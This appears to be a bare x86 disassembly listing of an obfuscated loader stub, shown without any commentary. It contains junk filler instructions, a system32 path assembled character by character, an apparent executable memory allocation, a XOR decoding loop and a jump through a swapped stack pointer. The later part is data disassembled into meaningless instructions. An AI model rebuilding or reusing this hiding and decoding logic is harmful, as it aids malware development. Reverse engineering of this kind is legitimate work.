  401c47:	mov    DWORD PTR [ebp-0x4],0x86de
  401c4e:	mov    DWORD PTR [ebp-0x4],0x86de
  401c55:	mov    DWORD PTR [ebp-0x4],0x86de
  401c5c:	mov    DWORD PTR [ebp-0x4],0x86de
  401c63:	mov    DWORD PTR [ebp-0x4],0x86de
  401c6a:	mov    DWORD PTR [ebp-0x4],0x86de
  401c71:	mov    DWORD PTR [ebp-0x4],0x86de
  401c78:	mov    DWORD PTR [ebp-0x4],0x86de
  401c7f:	mov    DWORD PTR [ebp-0x4],0x86de
  401c86:	mov    DWORD PTR [ebp-0x4],0x86de
  401c8d:	mov    DWORD PTR [ebp-0x4],0x86de
  401c94:	mov    DWORD PTR [ebp-0x4],0x86de
  401c9b:	mov    DWORD PTR [ebp-0x4],0x86de
  401ca2:	mov    DWORD PTR [ebp-0x4],0x86de
  401ca9:	mov    DWORD PTR [ebp-0x4],0x86de
  401cb0:	mov    DWORD PTR [ebp-0x4],0x86de
  401cb7:	mov    DWORD PTR [ebp-0x4],0x86de
  401cbe:	mov    DWORD PTR [ebp-0x4],0x86de
  401cc5:	mov    DWORD PTR [ebp-0x4],0x86de
  401ccc:	mov    DWORD PTR [ebp-0x4],0x86de
  401cd3:	mov    DWORD PTR [ebp-0x4],0x86de
  401cda:	mov    DWORD PTR [ebp-0x4],0x86de
  401ce1:	mov    DWORD PTR [ebp-0x4],0x86de
  401ce8:	mov    DWORD PTR [ebp-0x4],0x86de
  401cef:	mov    DWORD PTR [ebp-0x4],0x86de
  401cf6:	mov    DWORD PTR [ebp-0x4],0x86de
  401cfd:	mov    DWORD PTR [ebp-0x4],0x86de
  401d04:	mov    DWORD PTR [ebp-0x4],0x86de
  401d0b:	mov    DWORD PTR [ebp-0x4],0x86de
  401d12:	mov    DWORD PTR [ebp-0x4],0x86de
  401d19:	mov    DWORD PTR [ebp-0x4],0x86de
  401d20:	mov    DWORD PTR [ebp-0x4],0x86de
  401d27:	mov    DWORD PTR [ebp-0x4],0x86de
  401d2e:	mov    DWORD PTR [ebp-0x4],0x86de
  401d35:	mov    DWORD PTR [ebp-0x4],0x86de
  401d3c:	mov    DWORD PTR [ebp-0x4],0x86de
  401d43:	mov    DWORD PTR [ebp-0x4],0x86de
  401d4a:	mov    DWORD PTR [ebp-0x4],0x86de
  401d51:	mov    DWORD PTR [ebp-0x4],0x86de
  401d58:	mov    DWORD PTR [ebp-0x4],0x86de
  401d5f:	mov    DWORD PTR [ebp-0x4],0x86de
  401d66:	mov    DWORD PTR [ebp-0x4],0x86de
  401d6d:	mov    DWORD PTR [ebp-0x4],0x86de
  401d74:	mov    DWORD PTR [ebp-0x4],0x86de
  401d7b:	mov    DWORD PTR [ebp-0x4],0x86de
  401d82:	mov    DWORD PTR [ebp-0x4],0x86de
  401d89:	mov    DWORD PTR [ebp-0x4],0x86de
  401d90:	mov    DWORD PTR [ebp-0x4],0x86de
  401d97:	mov    DWORD PTR [ebp-0x4],0x0
  401d9e:	jmp    0x401da9
  401da0:	mov    eax,DWORD PTR [ebp-0x4]
  401da3:	add    eax,0x1
  401da6:	mov    DWORD PTR [ebp-0x4],eax
  401da9:	mov    ecx,DWORD PTR [ebp-0x4]
  401dac:	cmp    ecx,DWORD PTR ds:0x41f1ac
  401db2:	jae    0x401e17
  401db4:	mov    edx,DWORD PTR [ebp-0x4]
  401db7:	push   edx
  401db8:	mov    eax,ds:0x41f1b0
  401dbd:	push   eax
  401dbe:	call   0x4020b0
  401dc3:	add    esp,0x8
  401dc6:	sar    eax,0xc
  401dc9:	cmp    eax,0x3
  401dcc:	jne    0x401e15
  401dce:	mov    ecx,DWORD PTR [ebp-0x4]
  401dd1:	push   ecx
  401dd2:	mov    edx,DWORD PTR ds:0x41f1b0
  401dd8:	push   edx
  401dd9:	call   0x4020b0
  401dde:	add    esp,0x8
  401de1:	and    eax,0xfff
  401de6:	add    eax,0x907
  401deb:	mov    DWORD PTR [ebp-0x8],eax
  401dee:	mov    eax,DWORD PTR [ebp+0x8]
  401df1:	mov    ecx,DWORD PTR [ebp+0xc]
  401df4:	add    ecx,DWORD PTR [eax]
  401df6:	mov    edx,DWORD PTR [ebp-0x8]
  401df9:	mov    eax,DWORD PTR [ecx+edx*1-0x907]
  401e00:	add    eax,DWORD PTR [ebp+0x10]
  401e03:	mov    ecx,DWORD PTR [ebp+0x8]
  401e06:	mov    edx,DWORD PTR [ebp+0xc]
  401e09:	add    edx,DWORD PTR [ecx]
  401e0b:	mov    ecx,DWORD PTR [ebp-0x8]
  401e0e:	mov    DWORD PTR [edx+ecx*1-0x907],eax
  401e15:	jmp    0x401da0
  401e17:	mov    esp,ebp
  401e19:	pop    ebp
  401e1a:	ret    
  401e1b:	int3   
  401e1c:	int3   
  401e1d:	int3   
  401e1e:	int3   
  401e1f:	int3   
  401e20:	push   ebp
  401e21:	mov    ebp,esp
  401e23:	sub    esp,0x214
  401e29:	push   0x104
  401e2e:	lea    eax,[ebp-0x208]
  401e34:	push   eax
  401e35:	call   DWORD PTR ds:0x41f1b4
  401e3b:	mov    DWORD PTR [ebp-0x210],0x0
  401e45:	jmp    0x401e56
  401e47:	mov    ecx,DWORD PTR [ebp-0x210]
  401e4d:	add    ecx,0x1
  401e50:	mov    DWORD PTR [ebp-0x210],ecx
  401e56:	mov    edx,DWORD PTR [ebp-0x210]
  401e5c:	cmp    edx,DWORD PTR [ebp+0x10]
  401e5f:	jge    0x401f7f
  401e65:	cmp    DWORD PTR [ebp-0x210],0x0
  401e6c:	jne    0x401f25
  401e72:	mov    DWORD PTR [ebp-0x214],0x41e090
  401e7c:	mov    eax,0x5c
  401e81:	mov    ecx,DWORD PTR [ebp-0x214]
  401e87:	mov    WORD PTR [ecx],ax
  401e8a:	mov    edx,0x73
  401e8f:	mov    eax,DWORD PTR [ebp-0x214]
  401e95:	mov    WORD PTR [eax+0x2],dx
  401e99:	mov    ecx,0x79
  401e9e:	mov    edx,DWORD PTR [ebp-0x214]
  401ea4:	mov    WORD PTR [edx+0x4],cx
  401ea8:	mov    eax,0x65
  401ead:	mov    ecx,DWORD PTR [ebp-0x214]
  401eb3:	mov    WORD PTR [ecx+0xa],ax
  401eb7:	mov    edx,0x6d
  401ebc:	mov    eax,DWORD PTR [ebp-0x214]
  401ec2:	mov    WORD PTR [eax+0xc],dx
  401ec6:	mov    ecx,0x33
  401ecb:	mov    edx,DWORD PTR [ebp-0x214]
  401ed1:	mov    WORD PTR [edx+0xe],cx
  401ed5:	mov    eax,0x32
  401eda:	mov    ecx,DWORD PTR [ebp-0x214]
  401ee0:	mov    WORD PTR [ecx+0x10],ax
  401ee4:	mov    edx,0x5c
  401ee9:	mov    eax,DWORD PTR [ebp-0x214]
  401eef:	mov    WORD PTR [eax+0x12],dx
  401ef3:	mov    ecx,0x73
  401ef8:	mov    edx,DWORD PTR [ebp-0x214]
  401efe:	mov    WORD PTR [edx+0x16],cx
  401f02:	mov    eax,0x65
  401f07:	mov    ecx,DWORD PTR [ebp-0x214]
  401f0d:	mov    WORD PTR [ecx+0x24],ax
  401f11:	mov    edx,DWORD PTR [ebp-0x214]
  401f17:	push   edx
  401f18:	lea    eax,[ebp-0x208]
  401f1e:	push   eax
  401f1f:	call   DWORD PTR ds:0x41f1b8
  401f25:	mov    ecx,DWORD PTR [ebp+0x8]
  401f28:	add    ecx,DWORD PTR [ebp-0x210]
  401f2e:	mov    edx,DWORD PTR [ebp+0xc]
  401f31:	add    edx,DWORD PTR [ebp-0x210]
  401f37:	mov    al,BYTE PTR [edx]
  401f39:	mov    BYTE PTR [ecx],al
  401f3b:	cmp    DWORD PTR [ebp-0x210],0x0
  401f42:	jne    0x401f7a
  401f44:	push   0x0
  401f46:	push   0x80
  401f4b:	push   0x3
  401f4d:	push   0x0
  401f4f:	push   0x3
  401f51:	push   0x1
  401f53:	lea    ecx,[ebp-0x208]
  401f59:	push   ecx
  401f5a:	call   DWORD PTR ds:0x41f1bc
  401f60:	mov    DWORD PTR [ebp-0x20c],eax
  401f66:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  401f6d:	je     0x401f78
  401f6f:	cmp    DWORD PTR [ebp-0x20c],0x0
  401f76:	jne    0x401f7a
  401f78:	jmp    0x401fab
  401f7a:	jmp    0x401e47
  401f7f:	mov    edx,DWORD PTR [ebp+0x8]
  401f82:	cmp    edx,DWORD PTR ds:0x41f1a4
  401f88:	jne    0x401fab
  401f8a:	mov    eax,ds:0x41f1a0
  401f8f:	sub    eax,0x400000
  401f94:	push   eax
  401f95:	mov    ecx,DWORD PTR ds:0x41f1a0
  401f9b:	push   ecx
  401f9c:	mov    edx,DWORD PTR ds:0x41f190
  401fa2:	push   edx
  401fa3:	call   0x402270
  401fa8:	add    esp,0xc
  401fab:	mov    esp,ebp
  401fad:	pop    ebp
  401fae:	ret    
  401faf:	int3   
  401fb0:	push   ebp
  401fb1:	mov    ebp,esp
  401fb3:	mov    eax,DWORD PTR [ebp+0x8]
  401fb6:	mov    ecx,DWORD PTR [ebp+0x8]
  401fb9:	add    ecx,DWORD PTR [eax+0x4]
  401fbc:	mov    eax,ecx
  401fbe:	pop    ebp
  401fbf:	ret    
  401fc0:	push   ebp
  401fc1:	mov    ebp,esp
  401fc3:	sub    esp,0x220
  401fc9:	mov    DWORD PTR [ebp-0x8],0x307c
  401fd0:	mov    DWORD PTR [ebp-0x220],0x3000
  401fda:	mov    DWORD PTR [ebp-0x4],0x40
  401fe1:	mov    DWORD PTR [ebp-0x214],0x0
  401feb:	mov    DWORD PTR [ebp-0x218],0x0
  401ff5:	mov    DWORD PTR [ebp-0x8],0x307c
  401ffc:	mov    DWORD PTR [ebp-0x8],0x307c
  402003:	mov    DWORD PTR [ebp-0x8],0x307c
  40200a:	mov    eax,ds:0x41f0d0
  40200f:	mov    ds:0x41f1b8,eax
  402014:	mov    DWORD PTR [ebp-0x8],0x307c
  40201b:	mov    ecx,DWORD PTR ds:0x41f0d4
  402021:	mov    DWORD PTR ds:0x41f1bc,ecx
  402027:	mov    edx,DWORD PTR ds:0x41f0d8
  40202d:	mov    DWORD PTR ds:0x41f1b4,edx
  402033:	push   0x104
  402038:	lea    eax,[ebp-0x210]
  40203e:	push   eax
  40203f:	call   DWORD PTR ds:0x41f1b4
  402045:	mov    ecx,DWORD PTR [ebp-0x4]
  402048:	push   ecx
  402049:	mov    edx,DWORD PTR [ebp-0x220]
  40204f:	push   edx
  402050:	mov    eax,DWORD PTR [ebp+0x8]
  402053:	push   eax
  402054:	mov    ecx,DWORD PTR [ebp-0x214]
  40205a:	push   ecx
  40205b:	push   0xffffffff
  40205d:	call   DWORD PTR ds:0x41f0dc
  402063:	mov    esp,ebp
  402065:	pop    ebp
  402066:	ret    
  402067:	int3   
  402068:	int3   
  402069:	int3   
  40206a:	int3   
  40206b:	int3   
  40206c:	int3   
  40206d:	int3   
  40206e:	int3   
  40206f:	int3   
  402070:	push   ebp
  402071:	mov    ebp,esp
  402073:	push   ecx
  402074:	mov    DWORD PTR [ebp-0x4],0x5e3d
  40207b:	mov    ecx,ecx
  40207d:	mov    ecx,ecx
  40207f:	mov    ecx,ecx
  402081:	mov    ecx,ecx
  402083:	mov    edx,edx
  402085:	mov    edx,edx
  402087:	mov    edx,edx
  402089:	mov    ecx,ecx
  40208b:	mov    esp,DWORD PTR ds:0x41f198
  402091:	mov    ecx,ecx
  402093:	mov    edx,edx
  402095:	mov    ecx,ecx
  402097:	mov    edx,edx
  402099:	add    esp,0x4
  40209c:	mov    edx,edx
  40209e:	mov    ecx,ecx
  4020a0:	mov    edx,edx
  4020a2:	mov    edx,edx
  4020a4:	jmp    DWORD PTR ds:0x41f1a8
  4020aa:	mov    esp,ebp
  4020ac:	pop    ebp
  4020ad:	ret    
  4020ae:	int3   
  4020af:	int3   
  4020b0:	push   ebp
  4020b1:	mov    ebp,esp
  4020b3:	sub    esp,0x18
  4020b6:	mov    eax,DWORD PTR [ebp+0x8]
  4020b9:	mov    DWORD PTR [ebp-0x8],eax
  4020bc:	mov    ecx,DWORD PTR [ebp+0xc]
  4020bf:	mov    DWORD PTR [ebp-0x4],ecx
  4020c2:	mov    DWORD PTR [ebp-0x10],0x19c
  4020c9:	mov    edx,DWORD PTR [ebp-0x8]
  4020cc:	mov    DWORD PTR ds:0x41f1c0,edx
  4020d2:	mov    eax,DWORD PTR [ebp-0x4]
  4020d5:	mov    ds:0x41f1c4,eax
  4020da:	mov    ecx,DWORD PTR ds:0x41f1c0
  4020e0:	mov    DWORD PTR [ebp-0x14],ecx
  4020e3:	mov    edx,DWORD PTR ds:0x41f1c4
  4020e9:	mov    DWORD PTR [ebp-0xc],edx
  4020ec:	mov    eax,DWORD PTR [ebp-0xc]
  4020ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4020f2:	lea    edx,[ecx+eax*2]
  4020f5:	mov    DWORD PTR [ebp-0x18],edx
  4020f8:	mov    eax,DWORD PTR [ebp-0x18]
  4020fb:	mov    DWORD PTR [ebp-0x14],eax
  4020fe:	mov    ecx,DWORD PTR [ebp-0x14]
  402101:	movzx  edx,WORD PTR [ecx]
  402104:	mov    DWORD PTR [ebp-0xc],edx
  402107:	mov    eax,DWORD PTR [ebp-0xc]
  40210a:	mov    esp,ebp
  40210c:	pop    ebp
  40210d:	ret    
  40210e:	int3   
  40210f:	int3   
  402110:	push   ebp
  402111:	mov    ebp,esp
  402113:	sub    esp,0xc
  402116:	mov    eax,DWORD PTR [ebp+0x8]
  402119:	mov    DWORD PTR [ebp-0x8],eax
  40211c:	mov    ecx,DWORD PTR [ebp+0xc]
  40211f:	mov    DWORD PTR [ebp-0xc],ecx
  402122:	mov    DWORD PTR [ebp-0x4],0x22b
  402129:	mov    edx,DWORD PTR [ebp-0x8]
  40212c:	cmp    edx,DWORD PTR [ebp-0xc]
  40212f:	jae    0x40213f
  402131:	mov    DWORD PTR [ebp-0x4],0x22b
  402138:	mov    eax,DWORD PTR [ebp-0x8]
  40213b:	jmp    0x402149
  40213d:	jmp    0x402149
  40213f:	mov    DWORD PTR [ebp-0x4],0x22b
  402146:	mov    eax,DWORD PTR [ebp-0xc]
  402149:	mov    esp,ebp
  40214b:	pop    ebp
  40214c:	ret    
  40214d:	int3   
  40214e:	int3   
  40214f:	int3   
  402150:	push   ebp
  402151:	mov    ebp,esp
  402153:	cmp    DWORD PTR [ebp+0x8],0x1
  402157:	jne    0x402161
  402159:	mov    eax,ds:0x41f1c8
  40215e:	mov    DWORD PTR [ebp+0x8],eax
  402161:	mov    ecx,DWORD PTR [ebp+0x10]
  402164:	push   ecx
  402165:	mov    edx,DWORD PTR [ebp+0xc]
  402168:	push   edx
  402169:	mov    eax,DWORD PTR [ebp+0x8]
  40216c:	push   eax
  40216d:	call   0x4014a0
  402172:	add    esp,0xc
  402175:	mov    ecx,DWORD PTR [ebp+0x8]
  402178:	push   ecx
  402179:	call   0x401fb0
  40217e:	add    esp,0x4
  402181:	mov    DWORD PTR [ebp+0x8],eax
  402184:	mov    eax,DWORD PTR [ebp+0x8]
  402187:	pop    ebp
  402188:	ret    
  402189:	int3   
  40218a:	int3   
  40218b:	int3   
  40218c:	int3   
  40218d:	int3   
  40218e:	int3   
  40218f:	int3   
  402190:	push   ebp
  402191:	mov    ebp,esp
  402193:	sub    esp,0x228
  402199:	mov    DWORD PTR [ebp-0x218],0x0
  4021a3:	mov    DWORD PTR [ebp-0x214],0x41e0bc
  4021ad:	mov    DWORD PTR [ebp-0x4],0x22b
  4021b4:	mov    DWORD PTR [ebp-0x4],0x22b
  4021bb:	mov    DWORD PTR [ebp-0x220],0x0
  4021c5:	jmp    0x4021d6
  4021c7:	mov    eax,DWORD PTR [ebp-0x220]
  4021cd:	add    eax,0x4
  4021d0:	mov    DWORD PTR [ebp-0x220],eax
  4021d6:	mov    ecx,DWORD PTR [ebp-0x220]
  4021dc:	cmp    ecx,DWORD PTR [ebp+0xc]
  4021df:	jae    0x402266
  4021e5:	mov    DWORD PTR [ebp-0x4],0x22b
  4021ec:	mov    edx,DWORD PTR [ebp-0x220]
  4021f2:	add    edx,0x931
  4021f8:	mov    DWORD PTR ds:0x41f1cc,edx
  4021fe:	mov    eax,DWORD PTR [ebp+0x8]
  402201:	add    eax,DWORD PTR [ebp-0x220]
  402207:	mov    DWORD PTR [ebp-0x228],eax
  40220d:	mov    DWORD PTR [ebp-0x4],0x22b
  402214:	mov    ecx,DWORD PTR [ebp-0x228]
  40221a:	mov    edx,DWORD PTR [ecx]
  40221c:	add    edx,DWORD PTR [ebp-0x220]
  402222:	mov    eax,DWORD PTR [ebp-0x228]
  402228:	mov    DWORD PTR [eax],edx
  40222a:	mov    ecx,DWORD PTR [ebp-0x228]
  402230:	mov    DWORD PTR [ebp-0x224],ecx
  402236:	mov    edx,DWORD PTR ds:0x41f1cc
  40223c:	mov    DWORD PTR [ebp-0x4],edx
  40223f:	mov    eax,DWORD PTR [ebp-0x224]
  402245:	mov    ecx,DWORD PTR [eax]
  402247:	mov    DWORD PTR [ebp-0x4],ecx
  40224a:	mov    edx,DWORD PTR [ebp-0x4]
  40224d:	xor    edx,DWORD PTR ds:0x41f1cc
  402253:	mov    DWORD PTR [ebp-0x4],edx
  402256:	mov    eax,DWORD PTR [ebp-0x224]
  40225c:	mov    ecx,DWORD PTR [ebp-0x4]
  40225f:	mov    DWORD PTR [eax],ecx
  402261:	jmp    0x4021c7
  402266:	mov    esp,ebp
  402268:	pop    ebp
  402269:	ret    
  40226a:	int3   
  40226b:	int3   
  40226c:	int3   
  40226d:	int3   
  40226e:	int3   
  40226f:	int3   
  402270:	push   ebp
  402271:	mov    ebp,esp
  402273:	sub    esp,0x8
  402276:	mov    eax,DWORD PTR [ebp+0x8]
  402279:	cmp    DWORD PTR [eax+0x4],0x0
  40227d:	je     0x4022bb
  40227f:	mov    ecx,DWORD PTR [ebp+0x8]
  402282:	add    ecx,0x8
  402285:	mov    DWORD PTR ds:0x41f1b0,ecx
  40228b:	mov    edx,DWORD PTR [ebp+0x8]
  40228e:	mov    eax,DWORD PTR [edx+0x4]
  402291:	mov    ds:0x41f1ac,eax
  402296:	call   0x401400
  40229b:	mov    ecx,DWORD PTR [ebp+0x8]
  40229e:	mov    DWORD PTR ds:0x41f1c8,ecx
  4022a4:	mov    edx,DWORD PTR [ebp+0x10]
  4022a7:	push   edx
  4022a8:	mov    eax,DWORD PTR [ebp+0xc]
  4022ab:	push   eax
  4022ac:	push   0x1
  4022ae:	call   0x402150
  4022b3:	add    esp,0xc
  4022b6:	mov    DWORD PTR [ebp+0x8],eax
  4022b9:	jmp    0x402276
  4022bb:	mov    esp,ebp
  4022bd:	pop    ebp
  4022be:	ret    
  4022bf:	int3   
	...
  405d58:	add    BYTE PTR [edx],al
  405d5a:	add    BYTE PTR [eax],al
  405d5c:	xor    DWORD PTR [ecx],ecx
  405d5e:	add    BYTE PTR [eax],al
  405d60:	sub    DWORD PTR [ecx],ecx
  405d62:	add    BYTE PTR [eax],al
  405d64:	lods   eax,DWORD PTR ds:[esi]
  405d65:	cmp    edx,DWORD PTR [eax-0x67c462ce]
  405d6b:	xor    cl,ch
  405d6d:	cmp    esp,DWORD PTR [eax-0x57c432ce]
  405d73:	xor    dh,BYTE PTR [ecx]
  405d75:	imul   eax,DWORD PTR [ecx],0x94500
  405d7b:	add    BYTE PTR [edx+0x34],dl
  405d7e:	mov    edi,DWORD PTR ds:0x3d9a34a1
  405d84:	sahf   
  405d85:	xor    al,0xa8
  405d87:	cmp    eax,0x3dd334c7
  405d8c:	(bad)  
  405d8d:	xor    al,0xe8
  405d8f:	cmp    eax,0x3e2d372d
  405d94:	jmp    0xdd36:0xf83e5136
  405d9b:	ds push ebp
  405d9d:	add    BYTE PTR ss:[eax],al
  405da0:	xor    DWORD PTR [ecx+0x1],edi
  405da3:	add    BYTE PTR [ecx+0x9],bl
  405da6:	add    BYTE PTR [eax],al
  405da8:	outs   dx,BYTE PTR ds:[esi]
  405da9:	cmp    ebp,ecx
  405dab:	xor    BYTE PTR [ecx+edi*1],al
  405dae:	add    al,0x31
  405db0:	xor    al,0x38
  405db2:	daa    
  405db3:	xor    edi,ebx
  405db5:	aaa    
  405db6:	ret    
  405db7:	xor    edx,edi
  405db9:	aaa    
  405dba:	jmp    0xff787bf0
  405dbf:	xor    DWORD PTR [eax],eax
  405dc1:	xor    eax,0x5732123b
  405dc6:	cmp    esi,DWORD PTR [ecx]
  405dc8:	xor    bh,BYTE PTR [eax]
  405dca:	cmp    edi,DWORD PTR [edi]
  405dcc:	xor    dh,BYTE PTR [ebx+edi*1+0x58]
  405dd0:	xor    dh,al
  405dd2:	cmp    al,bh
  405dd4:	xor    dh,BYTE PTR [edi-0x4bcc74c7]
  405dda:	cmp    DWORD PTR [esi-0x32c67ecd],esp
  405de0:	xor    ecx,ebp
  405de2:	cmp    edx,ebp
  405de4:	xor    esi,DWORD PTR [ebx]
  405de6:	cmp    eax,0x3d673421
  405deb:	push   edi
  405dec:	xor    al,0xd
  405dee:	cmp    eax,0x3d283463
  405df3:	xor    BYTE PTR [ecx+ebp*4],0x3c
  405df7:	xchg   ecx,eax
  405df8:	xor    al,0xbe
  405dfa:	cmp    al,0x9e
  405dfc:	xor    al,0xdc
  405dfe:	cmp    al,0xbd
  405e00:	xor    al,0x73
  405e02:	cmp    al,0xd4
  405e04:	xor    al,0x5c
  405e06:	cmp    al,0xe7
  405e08:	xor    al,0x7f
  405e0a:	cmp    al,0x2
  405e0c:	xor    eax,0x35483c41
  405e11:	idiv   DWORD PTR [ebx]
  405e13:	push   esp
  405e14:	xor    eax,0x356a3bd4
  405e19:	mov    bl,0x3b
  405e1b:	mov    esi,0xd53b7935
  405e20:	xor    eax,0x35eb3b50
  405e25:	add    BYTE PTR [ebp+0x3b],al
  405e28:	(bad)  
  405e29:	xor    eax,0x360e3f28
  405e2e:	inc    ebp
  405e2f:	cmp    ebx,DWORD PTR ds:0x343b5636
  405e35:	ss pop ebx
  405e37:	cmp    edi,DWORD PTR [edi]
  405e39:	ss ins BYTE PTR es:[edi],dx
  405e3b:	cmp    ecx,DWORD PTR [ecx+0x36]
  405e3e:	jg     0x405e7b
  405e40:	push   esp
  405e41:	ss xchg ebx,eax
  405e43:	cmp    ebp,DWORD PTR [eax+0x36]
  405e46:	mov    WORD PTR [ebx],?
  405e48:	jb     0x405e80
  405e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4b:	cmp    ebx,DWORD PTR [edx-0x33c408ca]
  405e51:	add    edi,DWORD PTR ss:[esp+ebx*8]
  405e55:	ss aaa 
  405e57:	cmp    al,0x2b
  405e59:	aaa    
  405e5a:	sbb    DWORD PTR [esp+ecx*2],edi
  405e5d:	aaa    
  405e5e:	addr16 cmp al,0x63
  405e61:	aaa    
  405e62:	pop    eax
  405e63:	cmp    al,0x71
  405e65:	aaa    
  405e66:	cmp    BYTE PTR [esp+eax*4],bh
  405e69:	aaa    
  405e6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e6b:	cmp    al,0x9d
  405e6d:	aaa    
  405e6e:	sar    DWORD PTR [ecx+esi*4],cl
  405e71:	aaa    
  405e72:	ins    BYTE PTR es:[edi],dx
  405e73:	cmp    al,0xce
  405e75:	aaa    
  405e76:	xchg   DWORD PTR [eiz*8+0x93137],edi
  405e7d:	add    BYTE PTR [ecx],dh
  405e7f:	or     DWORD PTR [eax],eax
  405e81:	add    BYTE PTR [ecx],dh
  405e83:	or     DWORD PTR [eax],eax
  405e85:	add    BYTE PTR [ecx],dh
  405e87:	or     DWORD PTR [eax],eax
  405e89:	add    BYTE PTR [eax],al
  405e8b:	xor    DWORD PTR [ecx],ecx
  405e8d:	add    BYTE PTR [eax],al
  405e8f:	xor    DWORD PTR [ecx],ecx
  405e91:	add    BYTE PTR [eax],al
  405e93:	xor    DWORD PTR [ecx],ecx
  405e95:	add    BYTE PTR [eax],al
  405e97:	xor    DWORD PTR [ecx],ecx
  405e99:	add    BYTE PTR [eax],al
  405e9b:	xor    DWORD PTR [ecx],ecx
  405e9d:	add    BYTE PTR [eax],al
  405e9f:	xor    DWORD PTR [ecx],ecx
  405ea1:	add    BYTE PTR [eax],al
  405ea3:	xor    DWORD PTR [ecx],ecx
  405ea5:	add    BYTE PTR [eax],al
  405ea7:	xor    DWORD PTR [ecx],ecx
  405ea9:	add    BYTE PTR [eax],al
  405eab:	xor    DWORD PTR [ecx],ecx
  405ead:	add    BYTE PTR [eax],al
  405eaf:	xor    DWORD PTR [ecx],ecx
  405eb1:	add    BYTE PTR [eax],al
  405eb3:	xor    DWORD PTR [ecx],ecx
  405eb5:	add    BYTE PTR [eax],al
  405eb7:	xor    DWORD PTR [ecx],ecx
  405eb9:	add    BYTE PTR [eax],al
  405ebb:	xor    DWORD PTR [ecx],ecx
  405ebd:	add    BYTE PTR [eax],al
  405ebf:	xor    DWORD PTR [ecx],ecx
  405ec1:	add    BYTE PTR [eax],al
  405ec3:	xor    DWORD PTR [ecx],ecx
  405ec5:	add    BYTE PTR [eax],al
  405ec7:	xor    DWORD PTR [ecx],ecx
  405ec9:	add    BYTE PTR [eax],al
  405ecb:	xor    DWORD PTR [ecx],ecx
  405ecd:	add    BYTE PTR [eax],al
  405ecf:	xor    DWORD PTR [ecx],ecx
  405ed1:	add    BYTE PTR [eax],al
  405ed3:	xor    DWORD PTR [ecx],ecx
  405ed5:	add    BYTE PTR [eax],al
  405ed7:	xor    DWORD PTR [ecx],ecx
  405ed9:	add    BYTE PTR [eax],al
  405edb:	xor    DWORD PTR [ecx],ecx
  405edd:	add    BYTE PTR [eax],al
  405edf:	xor    DWORD PTR [ecx],ecx
  405ee1:	add    BYTE PTR [eax],al
  405ee3:	xor    DWORD PTR [ecx],ecx
  405ee5:	add    BYTE PTR [eax],al
  405ee7:	xor    DWORD PTR [ecx],ecx
  405ee9:	add    BYTE PTR [eax],al
  405eeb:	xor    DWORD PTR [ecx],ecx
  405eed:	add    BYTE PTR [eax],al
  405eef:	add    BYTE PTR [ecx],dh
  405ef1:	or     DWORD PTR [eax],eax
  405ef3:	add    BYTE PTR [ecx],dh
  405ef5:	or     DWORD PTR [eax],eax
  405ef7:	add    BYTE PTR [ecx],dh
  405ef9:	or     DWORD PTR [eax],eax
  405efb:	add    BYTE PTR [ecx],dh
  405efd:	or     DWORD PTR [eax],eax
  405eff:	add    BYTE PTR [ecx],dh
  405f01:	or     DWORD PTR [eax],eax
  405f03:	add    BYTE PTR [ecx],dh
  405f05:	or     DWORD PTR [eax],eax
  405f07:	add    BYTE PTR [ecx],dh
  405f09:	or     DWORD PTR [eax],eax
  405f0b:	add    BYTE PTR [ecx],dh
  405f0d:	or     DWORD PTR [eax],eax
  405f0f:	add    BYTE PTR [ecx],dh
  405f11:	or     DWORD PTR [eax],eax
  405f13:	add    BYTE PTR [ecx],dh
  405f15:	or     DWORD PTR [eax],eax
  405f17:	add    BYTE PTR [ecx],dh
  405f19:	or     DWORD PTR [eax],eax
  405f1b:	add    BYTE PTR [ecx],dh
  405f1d:	or     DWORD PTR [eax],eax
  405f1f:	add    BYTE PTR [ecx],dh
  405f21:	or     DWORD PTR [eax],eax
  405f23:	add    BYTE PTR [ecx],dh
  405f25:	or     DWORD PTR [eax],eax
  405f27:	add    BYTE PTR [ecx],dh
  405f29:	or     DWORD PTR [eax],eax
  405f2b:	add    BYTE PTR [ecx],dh
  405f2d:	or     DWORD PTR [eax],eax
  405f2f:	add    BYTE PTR [ecx],dh
  405f31:	or     DWORD PTR [eax],eax
  405f33:	add    BYTE PTR [ecx],dh
  405f35:	or     DWORD PTR [eax],eax
  405f37:	add    BYTE PTR [ecx],dh
  405f39:	or     DWORD PTR [eax],eax
  405f3b:	add    BYTE PTR [ecx],dh
  405f3d:	or     DWORD PTR [eax],eax
  405f3f:	add    BYTE PTR [ecx],dh
  405f41:	or     DWORD PTR [eax],eax
  405f43:	add    BYTE PTR [ecx],dh
  405f45:	or     DWORD PTR [eax],eax
  405f47:	add    BYTE PTR [ecx],dh
  405f49:	or     DWORD PTR [eax],eax
  405f4b:	add    BYTE PTR [ecx],dh
  405f4d:	or     DWORD PTR [eax],eax
  405f4f:	add    BYTE PTR [ecx],dh
  405f51:	or     DWORD PTR [eax],eax
  405f53:	add    BYTE PTR [eax],al
  405f55:	xor    DWORD PTR [ecx],ecx
  405f57:	add    BYTE PTR [eax],al
  405f59:	xor    DWORD PTR [ecx],ecx
  405f5b:	add    BYTE PTR [eax],al
  405f5d:	xor    DWORD PTR [ecx],ecx
  405f5f:	add    BYTE PTR [eax],al
  405f61:	add    BYTE PTR [edi+0x1],dh
  405f64:	add    BYTE PTR [ecx],dh
  405f66:	jo     0x405fa9
  405f68:	add    BYTE PTR [esi+0x6c],ch
  405f6b:	je     0x405fbd
  405f6d:	inc    ebx
  405f6e:	data16 arpl WORD PTR [ecx+0x4d],ax
  405f72:	ins    DWORD PTR es:[edi],dx
  405f73:	jb     0x405fda
  405f75:	and    bh,BYTE PTR [edx+0x0]
  405f78:	add    ch,dh
  405f7a:	gs popa 
  405f7c:	fs in  eax,dx
  405f7e:	pop    edi
  405f7f:	bound  esi,QWORD PTR [edx+0x10]
  405f82:	jnp    0x405ffd
  405f84:	inc    ebp
  405f85:	or     DWORD PTR [eax+0x0],ecx
  405f88:	add    ch,dh
  405f8a:	gs popa 
  405f8c:	fs in  eax,dx
  405f8e:	pop    edi
  405f8f:	bound  esi,QWORD PTR [edx+0x10]
  405f92:	jnp    0x40600d
  405f94:	inc    ebp
  405f95:	jmp    0xee405ff7
  405f9a:	imul   esi,DWORD PTR [ebp+ecx*2-0x32],0x6c
  405f9f:	jne    0x40600d
  405fa1:	int3   
  405fa2:	inc    eax
